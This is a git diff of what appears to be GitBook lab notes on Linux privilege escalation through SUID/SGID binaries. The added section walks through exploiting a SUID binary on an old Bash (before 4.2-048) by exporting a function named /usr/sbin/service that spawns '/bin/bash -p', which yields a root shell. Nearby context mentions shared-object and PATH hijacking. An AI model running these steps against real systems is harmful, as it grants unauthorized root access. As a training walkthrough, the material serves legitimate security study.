@@ -636,7 +636,7 @@ Run strace on the file and search the output for open/access calls and for "no s
 strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"
 ```
 
-<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1) (3).png" alt=""><figcaption></figcaption></figure>
 
 Note that the executable tries to load the /home/user/.config/libcalc.so shared object within our home directory, but it cannot be found.
 
@@ -664,7 +664,7 @@ Execute the suid-so executable again, and note that this time, instead of a prog
 /usr/local/bin/suid-so
 ```
 
-<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (3) (2).png" alt=""><figcaption></figcaption></figure>
 
 ## SUID / SGID Executables - Environment Variables
 
@@ -678,7 +678,7 @@ First, execute the file and note that it seems to be trying to start the apache2
 /usr/local/bin/suid-env
 ```
 
-<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (2) (5).png" alt=""><figcaption></figcaption></figure>
 
 Run strings on the file to look for strings of printable characters.
 
@@ -722,6 +722,49 @@ PATH=.:$PATH /usr/local/bin/suid-env
 
 
 ## SUID / SGID Executables - Abusing Shell Features (#1)
+
+The /usr/local/bin/suid-env2 executable is identical to /usr/local/bin/suid-env except that it uses the absolute path of the service executable (/usr/sbin/service) to start the apache2 webserver.
+
+Verify this with strings
+
+**Victim**
+
+```
+strings /usr/local/bin/suid-env2
+```
+
+<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+
+In Bash versions <4.2-048 it is possible to define shell functions with names that resemble file paths, then export those functions so that they are used instead of any actual executable at that file path.
+
+Verify the version of Bash installed on the Debian VM is less than 4.2-048.
+
+**Victim**
+
+```
+/bin/bash --version
+```
+
+<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+
+Create a Bash function with the name "/usr/sbin/service" that executes a new Bash shell (using -p so permissions are preserved) and export the function:
+
+**Victim**
+
+```
+function /usr/sbin/service { /bin/bash -p; }
+export -f /usr/sbin/service
+```
+
+Run the suid-env2 executable to gain a root shell.
+
+**Victim**
+
+```
+/usr/local/bin/suid-env2
+```
+
+<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
 
 ## SUID / SGID Executables - Abusing Shell Features (#2)
 
